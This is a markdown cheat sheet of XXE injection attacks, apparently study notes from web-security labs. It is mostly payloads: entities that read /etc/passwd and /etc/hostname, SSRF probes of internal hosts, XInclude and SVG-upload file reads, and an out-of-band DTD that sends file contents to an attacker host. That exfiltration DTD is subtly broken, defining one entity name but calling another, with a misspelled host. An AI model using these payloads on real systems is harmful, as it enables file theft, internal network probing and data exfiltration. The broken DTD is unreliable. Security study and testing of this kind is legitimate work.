# XXE

<details>

<summary>Introduction</summary>

**What is XML**

* Some applications use the XML format to transmit data between the browser and the server.
* Its popularity has now declined in favor of the JSON format

**XXE Impact**

* Retrieve files
* Perform SSRF attacks

</details>

## Retrieve files

1. Introduce (or edit) a DOCTYPE element defining an external entity with the file path.
2. Edit a data value in the XML returned in the app's response to use the defined external entity.

* Note: to systematically test for XXE, test each data node in the XML individually using your defined entity to see if it appears in the response.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck> 
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## Perform SSRF attacks

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## Blind XXE

### Out-of-band (OAST) techniques <a href="#detecting-blind-xxe-using-out-of-band-oast-techniques" id="detecting-blind-xxe-using-out-of-band-oast-techniques"></a>

**Detection**

* Detecting as SSRF
  * ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
    ```
* Regular entities are blocked? Bypass via XML parameter entities
  * ```xml
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
    ```
  * This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD

**Exploitation**

1. Start a web server and host on `http://YOUR-DTD-URL/example.dtd` this malicious dtd.

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attaccker.com/?x=%file;'>">
%eval;
%exfil;
```

2. Add this external entity

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-DTD-URL/example.dtd"> %xxe;]>
```

## Finding hidden attack surface for XXE injection

**First case** - Requests that contain data in XML format

**Second case -** Requests that do not contain any XML

* **Detection**: Add entity reference that doesn't exist to cause an error  -> ok it's XML ...
* XInclude attacks
  * Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document
  * XInclude is a part of the XML specification that allows an XML document to be built from sub-documents
  * ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```
* Via file upload
  * Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG
  * ```xml
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
        <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ```
  * This works if it's used image processing library & support SVG images & allow external entity
* Via modified content type
  * To do
